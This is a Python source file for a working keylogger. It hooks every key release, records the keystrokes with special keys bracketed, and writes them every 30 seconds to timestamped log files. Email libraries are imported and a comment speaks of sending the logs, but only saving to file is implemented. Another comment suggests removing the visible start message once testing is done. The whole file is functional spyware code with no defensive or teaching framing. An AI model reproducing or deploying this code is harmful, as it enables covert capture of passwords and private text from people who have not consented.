import keyboard
import smtplib

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 30 # Send keylogs every 30 seconds

class Keylogger:

    def __init__(self, interval, report_method="file"):
        # Interval will be the same value as SEND_REPORT_EVERY
        self.interval = interval
        self.report_method = report_method

        # String variable that will log all keystrokes
        self.log = ""   

        # Record start and end times
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        The callback is called whenever a keyboard event occurs, which in this 
        case will be when a key is pressed/released.
        """

        name = event.name

        if len(name) > 1:
            # add an actual space
            if name == "space":
                name = " "

            elif name == "enter":
                # add a newline everytime the enter key is used
                name = "[ENTER]\n"

            elif name == "decimal":
                name = "."
            
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")

                # capitalize all values and surround them with []
                name = f"[{name.upper()}]"
        
        # add name of key to the log
        self.log += name

    def update_filename(self):
        # create filename identified by start and end time
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"log-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """
        Creates log file in current directory that contains logs from self.log
        """

        # open file in write mode
        with open(f"{self.filename}.txt", "w") as new_file:

            # write log to file
            print(self.log, file=new_file)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):

        if self.log:
            # if there is something in log, send a report
            self.end_dt = datetime.now()

            # update filename
            self.update_filename()

            if self.report_method == "file":
                self.report_to_file()

            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)

        # set thread as daemon (dies when main thread dies)
        timer.daemon = True

        # start timer
        timer.start()

    def start(self):

        # record start
        self.start_dt = datetime.now()

        # start log
        keyboard.on_release(callback=self.callback)

        # start reporting the logs
        self.report()

        # simple message
        print(f"{datetime.now()} - Started keylogger") # <--- take this out when done testing

        # block current thread, wait until CTRL + C pressed
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()